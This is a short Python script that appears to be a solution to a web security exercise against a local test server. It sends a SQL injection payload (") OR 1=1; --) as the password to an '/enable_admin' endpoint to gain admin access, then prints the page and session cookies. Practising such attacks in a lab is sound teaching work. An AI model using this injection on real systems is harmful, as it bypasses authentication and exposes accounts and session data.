import requests
import solution_q1


def make_admin_session(server_addr):
    s = solution_q1.make_login_session()
    s.post(server_addr + '/enable_admin',
           data={'password': '") OR 1=1; --'})
    return s


def solve(server_addr):
    s = make_admin_session(server_addr)
    response = s.get(server_addr + '/')
    print(response.text)
    print(s.cookies)


if __name__ == '__main__':
    solve('http://localhost:8000')

